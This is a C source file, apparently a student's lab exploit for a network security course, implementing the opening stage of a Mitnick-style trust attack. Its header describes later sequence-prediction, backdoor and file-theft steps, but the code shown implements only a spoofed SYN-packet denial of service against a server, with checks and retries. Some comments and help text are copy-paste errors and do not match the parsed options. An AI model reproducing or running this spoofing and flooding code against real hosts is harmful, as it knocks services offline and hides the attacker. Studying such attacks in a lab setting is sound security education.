/* EXPLOIT.c
 *   by DukeD1rtfarm3r
 *
 * Created:
 *   10/09/2020, 15:27:09
 * Last edited:
 *   11/09/2020, 20:14:31
 * Auto updated?
 *   Yes
 *
 * Description:
 *   This file is the entry point for the exploit of assignment 2 of the
 *   course Computer and Network Security.
 * 
 *   The Mitnick-Attack works in the following way by exploiting a trust
 *   relationship between a terminal and a server. First, we will DoS the
 *   server so it will not bother subsequent communication between us and the
 *   terminal. Then, we will send many TCP-handshakes with the xterminal to
 *   (hopefully) determine a fault in its TCP sequence number generation, which
 *   we can use to predict those. Finally, we inject a backdoor in the
 *   xterminal using said broken sequence number prediction.
 * 
 *   Note that this program supports three operating modes:
 *     - Smash 'n' grab (--smashgrab): Runs the exploit, steals the secret.txt
 *       and cleans up again (including removal of said backdoor)
 *     - Exploit (--exploit): Only exploit the server, but do not cleanup yet
 *     - Cleanup (--cleanup): Cleanup an exploited server.
 * 
 *   Useful sources:
 *     - http://books.gigatux.nl/mirror/networksecuritytools/0596007949/networkst-CHP-11-SECT-2.html#networkst-CHP-11-TABLE-1
 *     - http://books.gigatux.nl/mirror/networksecuritytools/0596007949/networkst-CHP-11-SECT-4.html
 *     - https://fossies.org/dox/libnet-libnet-1.2/libnet-functions_8h.html
 *     - https://www.devdungeon.com/content/using-libpcap-c
 *     - https://www.tcpdump.org/manpages/
 * 
**/

typedef unsigned int uint;
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <libnet.h>
#include <pcap.h>

#include "tools.h"
#include "globals.h"


/***** HELPER FUNCTIONS *****/
/* Prints a neat help message. */
void print_help(char* executable) {
    printf("Usage: %s -x XTERM_IP -s SERVER_IP -i INTERFACE\n", executable);
    printf("\n-h, --help\t\tShows this help message.\n");
    printf("\n-I, --server-ip\t\tSets the server IPv4-address that we want to use for the attack (DEFAULT: %u.%u.%u.%u).\n",
           IP_FORMAT(DEFAULT_SERVER_ADDR));
    printf("\n-i, --xterm-ip\t\tSets the xterminal IPv4-address that we want to use for the attack (DEFAULT: %u.%u.%u.%u).\n",
           IP_FORMAT(DEFAULT_XTERM_ADDR));
    printf("\n-d, --device\t\tSets the interface we want to use (DEFAULT: %s).\n",
           DEFAULT_INTERFACE);
    printf("\n");
}

/* Parses the commandline arguments. Returns 0 on success, or an error code if something went wrong. */
int parse_cli(uint32_t* xterm_ip, uint32_t* server_ip, char* interface, int argc, char** argv) {
    for (int i = 1; i < argc; i++) {
        char* arg = argv[i];
        if (arg[0] == '-') {
            // Either single-label or multi-label
            if ((arg[1] == 'h' && arg[2] == '\0') || streq(arg + 1, "-help")) {
                // Print the help message, then quit
                print_help(argv[0]);
                return -2;
            } else if ((arg[1] == 'i' && arg[2] == '\0') || streq(arg + 1, "-xterm-ip")) {
                // xterm ip, so parse the next argument as an ip
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (!str_to_ip(xterm_ip, argv[i + 1])) { return EXIT_FAILURE; }
            } else if ((arg[1] == 'I' && arg[2] == '\0') || streq(arg + 1, "-server-ip")) {
                // xterm ip, so parse the next argument as an ip
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (!str_to_ip(server_ip, argv[i + 1])) { return EXIT_FAILURE; }
            } else if ((arg[1] == 'd' && arg[2] == '\0') || streq(arg + 1, "-device")) {
                // xterm ip, so parse the next argument as an ip
                if (i == argc - 1) {
                    fprintf(stderr, "[ERROR] Missing value for '%s'.\n", arg);
                    return -1;
                }
                if (strlen(argv[i + 1]) >= MAX_INTERFACE_SIZE) {
                    fprintf(stderr, "[ERROR] Device name '%s' too long.\n", argv[i + 1]);
                    return -1;
                }
                strcpy(interface, argv[i + 1]);
            } else {
                fprintf(stderr, "[ERROR] Unknown option '%s' (see '--help' for a complete list).\n", arg);
                return -1;
            }
        }
    }

    // Done
    return 0;

}



/***** ATTACKS *****/
/* Runs the DoS attack from the given libnet socket to the server with given ip. Returns 0 if it was succesful, or something else otherwise. */
int attack_DoS(libnet_t* l, uint32_t xterm_ip, uint32_t server_ip) {
    // Define the payload
    char* payload = "disable";
    int payload_size = strlen(payload);

    // Build the TCP header
    libnet_ptag_t tcp = libnet_build_tcp(
        libnet_get_prand(LIBNET_PRu16), // We use any arbitrary source port number
        DEFAULT_DOS_TARGET_PORT,
        libnet_get_prand(LIBNET_PRu16), // We use any arbitrary sequence number
        0,                              // We use any arbitrary acknowledgement number
        TH_SYN,                         // We use only the SYN control
        7,                              // The window size (pretty arbitrary as well)
        0,                              // The checksum will be handled automatically by libnet
        0,                              // The urgent pointer - zero, as it's not urgent
        LIBNET_TCP_H + payload_size,    // Total TCP packet length
        (const uint8_t*) payload,
        payload_size,
        l,
        0                               // We want to build a new header rather than modify one
    );
    if (tcp == -1) {
        fprintf(stderr, "[ERROR] Could not build the DoS-attack TCP header: %s\n", libnet_geterror(l));
        return -1;
    }

    // Next, we build the ipv4 header
    libnet_ptag_t ipv4 = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_size,
        0,                                              // Neutral Terms-of-Service
        libnet_get_prand(LIBNET_PRu16),                 // Arbitrary IP ID
        0,                                              // No fragment offset
        127,                                            // The time-to-live on the webs
        IPPROTO_TCP,                                    // The next protocol is our TCP
        0,                                              // Autofill the checksum
        xterm_ip,
        server_ip,
        NULL,                                           // No payload, as libpcap will link these together
        0,                                              // Payload size is therefore also NULL
        l,
        0                                               // We want to build a new header rather than modify one
    );
    if (ipv4 == -1) {
        fprintf(stderr, "[ERROR] Could not build the DoS-attack IPv4 header: %s\n", libnet_geterror(l));
        return -1;
    }

    // Send that exact same packet 10 times
    for (int i = 0; i < 10; i++) {
        if (libnet_write(l) == -1) {
            fprintf(stderr, "[ERROR] Could not send DoS-attack packet %d/10: %s\n", i + 1, libnet_geterror(l));
            return EXIT_FAILURE;
        }
    }

    // We made it through!
    return 0;
}



/***** ENTRY POINT *****/
int main(int argc, char** argv) {
    /* Parse the command line args. */
    // Declare the space to hold the values
    uint32_t xterm_ip = DEFAULT_XTERM_ADDR;
    uint32_t server_ip = DEFAULT_SERVER_ADDR;
    char interface[MAX_INTERFACE_SIZE];
    strcpy(interface, DEFAULT_INTERFACE);

    // Parse the CLI
    int result = parse_cli(&xterm_ip, &server_ip, interface, argc, argv);
    if (result == -2) { return EXIT_SUCCESS; }
    else if (result != 0) { return result; }

    /* Print a neat header message. */
    printf("\n*** KEVIN MITNICK SIMULATOR 2020 ***\n\n");

    // Print the options used
    printf("Using options:\n");
    printf(" - Xterminal IP : %u.%u.%u.%u\n", IP_FORMAT(xterm_ip));
    printf(" - Server IP    : %u.%u.%u.%u\n", IP_FORMAT(server_ip));
    printf(" - Interface : '%s'\n", interface);
    printf("\n");
    fflush(stdout);

    /* Prepare exploitation by opening an interface. */
    printf("Initializing libnet on interface '%s'...\n", interface);
    // Initialize the libnet context & error message buffer
    libnet_t* l;
    char libnet_error[LIBNET_ERRBUF_SIZE];

    // Open a raw IP4 socket
    l = libnet_init(LIBNET_RAW4, interface, libnet_error);
    if (l == NULL) {
        fprintf(stderr, "[ERROR] Could not initialize libnet: %s\n\n", libnet_error);
        return EXIT_FAILURE;
    }

    // Set the random seed appropriately
    if (libnet_seed_prand(l) == -1) {
        fprintf(stderr, "[ERROR] Could not seed the random number generator of libnet.\n");
        return EXIT_FAILURE;
    }

    /* Run the DoS on the server. */
    // First, we run the exploit
    printf("Running DoS on server @ %d.%d.%d.%d...\n", IP_PART(server_ip, 0), IP_PART(server_ip, 1), IP_PART(server_ip, 2), IP_PART(server_ip, 3));
    for (int i = 1; i <= MAX_DOS_TRIES; i++) {
        result = attack_DoS(l, xterm_ip, server_ip);
        if (result != 0) {
            libnet_destroy(l);
            return result;
        }

        // Then, we check if we were succesful
        printf("Checking if server %d.%d.%d.%d is down...", IP_PART(server_ip, 0), IP_PART(server_ip, 1), IP_PART(server_ip, 2), IP_PART(server_ip, 3)); fflush(stdout);
        result = verify_DoS(l, interface, xterm_ip, server_ip);
        if (result == 1) {
            // Succes! Time to run the next part
            printf(" SUCCES\n");
            break;
        } else if (result == 0) {
            // DoS doesn't seem to have worked...
            printf(" FAIL\nRetrying DoS (%d/%d)...", i + 1, MAX_DOS_TRIES);
        } else {
            // Error occured
            return result;
        }
    }

    /* Cleanup. */
    libnet_destroy(l);
    printf("\nDone.\n\n");

    return EXIT_SUCCESS;
    
}
